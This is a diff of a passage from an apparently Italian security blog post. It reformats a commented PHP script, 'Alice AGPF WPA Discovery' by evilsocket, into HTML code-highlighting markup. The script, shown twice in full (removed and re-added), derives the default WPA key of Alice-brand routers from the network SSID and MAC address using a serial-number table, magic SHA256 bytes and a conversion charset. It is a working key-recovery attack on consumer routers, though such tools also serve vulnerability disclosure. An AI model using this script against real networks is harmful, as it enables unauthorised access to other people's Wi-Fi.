@@ -26,136 +26,140 @@ Lo script è commentato (come il precedente), in modo tale il lettore avrà la p
 
 Enjoy.
 
-<pre><pre><code><?php
-/***************************************************************************
- *   Alice AGPF WPA Discovery                                              *
- *   by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net      *
- *   based on <http://wifiresearchers.wordpress.com/>                      *
- *                                                                         *
- *   This program is free software; you can redistribute it and/or modify  *
- *   it under the terms of the GNU General Public License as published by  *
- *   the Free Software Foundation; either version 2 of the License, or     *
- *   (at your option) any later version.                                   *
- *                                                                         *
- *   This program is distributed in the hope that it will be useful,       *
- *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
- *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
- *   GNU General Public License for more details.                          *
- *                                                                         *
- *   You should have received a copy of the GNU General Public License     *
- *   along with this program; if not, write to the                         *
- *   Free Software Foundation, Inc.,                                       *
- *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
- ***************************************************************************/
+<pre>
 
-/*
- * Tabella per il calcolo del seriale.
- *
- * First SSID digits => ( SN1, k, Q )
- */
-$SN_TABLE   = array( '96' => array( '69102', 13, 96017051 ),
-                     '93' => array( '69101', 13, 92398366 ),
-                     '56' => array( '67902', 13, 54808800 ),
-                     '55' => array( '67904', 8,  55164449 ),
-                     '54' => array( '67903', 8,  52420689 ),
-                     '48' => array( '67903', 8,  47896103 ),
-                     '46' => array( '67902', 13, 39015145 ) );
-/*
- * Numeri magici da utilizzare per il calcolo dell'SHA256.
- */
-$ALIS       = "\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8";
-/*
- * Tabella di conversione da hash a wpa.
- */
-$CONV_TABLE = "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuv".
-              "wxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123";
-/* 
- * SSID della rete.
- */
-$SSID       = "Alice-96154825";
-/*
- * MAC address del router.
- */
-$MAC        = "\x00\x23\x8E\x01\x02\x03";
-/*
- * Calcolo il seriale in base al SSID e alla tabella dei valori noti.
- */
-$SN         = SSID2SN($SSID);
-/*
- * Calcolo SHA256( MagicN + SN + MAC )
- */
-$hash       = SHA256( $ALIS.$SN.$MAC );
-/*
- * Converto la stringa dell'hash in un array di byte.
- */
-$bytes      = hash2bytes($hash);
-/*
- * Trovo la WPA utilizzando i primi 24 byte dell'hash come indici della tabella di covnersione.
- */
-$wpa   = "";
-for( $i = 0; $i < 24; $i++ ){
-    $wpa .= $CONV_TABLE[ $bytes[$i] ];
-}
+<div class="codecolorer-container text default" style="overflow:auto;white-space:nowrap;width:100%;height:100%;"><div class="text codecolorer">&amp;lt;?php<br />
+/***************************************************************************<br />
+&nbsp;* &nbsp; Alice AGPF WPA Discovery &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
+&nbsp;* &nbsp; by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net &nbsp; &nbsp; &nbsp;*<br />
+&nbsp;* &nbsp; based on &amp;lt;http://wifiresearchers.wordpress.com/&amp;gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
+&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; This program is free software; you can redistribute it and/or modify &nbsp;*<br />
+&nbsp;* &nbsp; it under the terms of the GNU General Public License as published by &nbsp;*<br />
+&nbsp;* &nbsp; the Free Software Foundation; either version 2 of the License, or &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; (at your option) any later version. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; This program is distributed in the hope that it will be useful, &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; but WITHOUT ANY WARRANTY; without even the implied warranty of &nbsp; &nbsp; &nbsp; &nbsp;*<br />
+&nbsp;* &nbsp; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. &nbsp;See the &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; GNU General Public License for more details. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*<br />
+&nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; You should have received a copy of the GNU General Public License &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; along with this program; if not, write to the &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; Free Software Foundation, Inc., &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;* &nbsp; 59 Temple Place - Suite 330, Boston, MA &nbsp;02111-1307, USA. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<br />
+&nbsp;***************************************************************************/<br />
+<br />
+/*<br />
+&nbsp;* Tabella per il calcolo del seriale.<br />
+&nbsp;*<br />
+&nbsp;* First SSID digits =&amp;gt; ( SN1, k, Q )<br />
+&nbsp;*/<br />
+$SN_TABLE &nbsp; = array( '96' =&amp;gt; array( '69102', 13, 96017051 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'93' =&amp;gt; array( '69101', 13, 92398366 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'56' =&amp;gt; array( '67902', 13, 54808800 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'55' =&amp;gt; array( '67904', 8, &nbsp;55164449 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'54' =&amp;gt; array( '67903', 8, &nbsp;52420689 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'48' =&amp;gt; array( '67903', 8, &nbsp;47896103 ),<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;'46' =&amp;gt; array( '67902', 13, 39015145 ) );<br />
+/*<br />
+&nbsp;* Numeri magici da utilizzare per il calcolo dell'SHA256.<br />
+&nbsp;*/<br />
+$ALIS &nbsp; &nbsp; &nbsp; = &quot;\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8&quot;;<br />
+/*<br />
+&nbsp;* Tabella di conversione da hash a wpa.<br />
+&nbsp;*/<br />
+$CONV_TABLE = &quot;0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuv&quot;.<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;wxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123&quot;;<br />
+/* <br />
+&nbsp;* SSID della rete.<br />
+&nbsp;*/<br />
+$SSID &nbsp; &nbsp; &nbsp; = &quot;Alice-96154825&quot;;<br />
+/*<br />
+&nbsp;* MAC address del router.<br />
+&nbsp;*/<br />
+$MAC &nbsp; &nbsp; &nbsp; &nbsp;= &quot;\x00\x23\x8E\x01\x02\x03&quot;;<br />
+/*<br />
+&nbsp;* Calcolo il seriale in base al SSID e alla tabella dei valori noti.<br />
+&nbsp;*/<br />
+$SN &nbsp; &nbsp; &nbsp; &nbsp; = SSID2SN($SSID);<br />
+/*<br />
+&nbsp;* Calcolo SHA256( MagicN + SN + MAC )<br />
+&nbsp;*/<br />
+$hash &nbsp; &nbsp; &nbsp; = SHA256( $ALIS.$SN.$MAC );<br />
+/*<br />
+&nbsp;* Converto la stringa dell'hash in un array di byte.<br />
+&nbsp;*/<br />
+$bytes &nbsp; &nbsp; &nbsp;= hash2bytes($hash);<br />
+/*<br />
+&nbsp;* Trovo la WPA utilizzando i primi 24 byte dell'hash come indici della tabella di covnersione.<br />
+&nbsp;*/<br />
+$wpa &nbsp; = &quot;&quot;;<br />
+for( $i = 0; $i &amp;lt; 24; $i++ ){<br />
+&nbsp; &nbsp; $wpa .= $CONV_TABLE[ $bytes[$i] ];<br />
+}<br />
+<br />
+echo &quot;WPA : $wpa\n&quot;;<br />
+<br />
+/*<br />
+&nbsp;* Funzione per risalire al seriale del router partendo dal suo SSID e utilizzando<br />
+&nbsp;* le tabelle dei valori noti.<br />
+&nbsp;*/<br />
+function SSID2SN( $ssid ){<br />
+&nbsp; &nbsp; global $SN_TABLE;<br />
+&nbsp; &nbsp; /*<br />
+&nbsp; &nbsp; &nbsp;* Prelevo il numero intero dall'SSID e ne prendo le prime due cifre<br />
+&nbsp; &nbsp; &nbsp;* per verificare che il router sia presente nella tabella.<br />
+&nbsp; &nbsp; &nbsp;*/<br />
+&nbsp; &nbsp; preg_match_all( &quot;/^Alice\-([0-9]+)/&quot;, $ssid, $m );<br />
+<br />
+&nbsp; &nbsp; $ssidn = $m[1][0];<br />
+&nbsp; &nbsp; $id &nbsp; &nbsp;= substr( $ssidn, 0, 2 );<br />
+<br />
+&nbsp; &nbsp; if( isset( $SN_TABLE[$id] ) ){<br />
+&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Ok, il router è presente nella tabella, prelevo la prima parte del seriale e<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* le costanti k e Q da utilizzare nell'equazione finale.<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
+&nbsp; &nbsp; &nbsp; &nbsp; $sn1 = $SN_TABLE[$id][0];<br />
+&nbsp; &nbsp; &nbsp; &nbsp; $k &nbsp; = $SN_TABLE[$id][1];<br />
+&nbsp; &nbsp; &nbsp; &nbsp; $Q &nbsp; = $SN_TABLE[$id][2];<br />
+&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* La seconda parte del seriale equivale a :<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* &nbsp; &nbsp; &nbsp;(SSID - Q) / k<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
+&nbsp; &nbsp; &nbsp; &nbsp; $sn2 = ((int)$ssidn - $Q) / $k; <br />
+&nbsp; &nbsp; &nbsp; &nbsp; /*<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Restituisco il seriale completo.<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/<br />
+&nbsp; &nbsp; &nbsp; &nbsp; return $sn1.'X'.sprintf( &quot;%07s&quot;, $sn2 );<br />
+&nbsp; &nbsp; }<br />
+&nbsp; &nbsp; /*<br />
+&nbsp; &nbsp; &nbsp;* Router non presente nella tabella.<br />
+&nbsp; &nbsp; &nbsp;*/<br />
+&nbsp; &nbsp; else{<br />
+&nbsp; &nbsp; &nbsp; &nbsp; die( &quot;La serie 'Alice-$id******' non è presente nella tabella e non è supportata.\n&quot; );<br />
+&nbsp; &nbsp; }<br />
+}<br />
+/*<br />
+&nbsp;* Funzione per il calcolo di un hash SHA256.<br />
+&nbsp;*/<br />
+function SHA256( $phrase ){<br />
+&nbsp; &nbsp; return bin2hex( mhash( MHASH_SHA256, $phrase ) );<br />
+}<br />
+/*<br />
+&nbsp;* Funzione per convertire un hash in un array di byte interi.<br />
+&nbsp;*/<br />
+function hash2bytes( $hash ){<br />
+&nbsp; &nbsp; preg_match_all( &quot;/[a-f0-9]{2}/i&quot;, $hash, $hash_bytes );<br />
+&nbsp; &nbsp; $bytes = array();<br />
+&nbsp; &nbsp; foreach( $hash_bytes[0] as $byte ){<br />
+&nbsp; &nbsp; &nbsp; &nbsp; $bytes[] = hexdec($byte);<br />
+&nbsp; &nbsp; }<br />
+&nbsp; &nbsp; <br />
+&nbsp; &nbsp; return $bytes;<br />
+}<br />
+<br />
+?&amp;gt;</div></div>
 
-echo "WPA : $wpa\n";
-
-/*
- * Funzione per risalire al seriale del router partendo dal suo SSID e utilizzando
- * le tabelle dei valori noti.
- */
-function SSID2SN( $ssid ){
-    global $SN_TABLE;
-    /*
-     * Prelevo il numero intero dall'SSID e ne prendo le prime due cifre
-     * per verificare che il router sia presente nella tabella.
-     */
-    preg_match_all( "/^Alice\-([0-9]+)/", $ssid, $m );
-
-    $ssidn = $m[1][0];
-    $id    = substr( $ssidn, 0, 2 );
-
-    if( isset( $SN_TABLE[$id] ) ){
-        /*
-         * Ok, il router è presente nella tabella, prelevo la prima parte del seriale e
-         * le costanti k e Q da utilizzare nell'equazione finale.
-         */
-        $sn1 = $SN_TABLE[$id][0];
-        $k   = $SN_TABLE[$id][1];
-        $Q   = $SN_TABLE[$id][2];
-        /*
-         * La seconda parte del seriale equivale a :
-         *      (SSID - Q) / k
-         */
-        $sn2 = ((int)$ssidn - $Q) / $k; 
-        /*
-         * Restituisco il seriale completo.
-         */
-        return $sn1.'X'.sprintf( "%07s", $sn2 );
-    }
-    /*
-     * Router non presente nella tabella.
-     */
-    else{
-        die( "La serie 'Alice-$id******' non è presente nella tabella e non è supportata.\n" );
-    }
-}
-/*
- * Funzione per il calcolo di un hash SHA256.
- */
-function SHA256( $phrase ){
-    return bin2hex( mhash( MHASH_SHA256, $phrase ) );
-}
-/*
- * Funzione per convertire un hash in un array di byte interi.
- */
-function hash2bytes( $hash ){
-    preg_match_all( "/[a-f0-9]{2}/i", $hash, $hash_bytes );
-    $bytes = array();
-    foreach( $hash_bytes[0] as $byte ){
-        $bytes[] = hexdec($byte);
-    }
-    
-    return $bytes;
-}
-
-?></pre></code></pre>
+</pre>
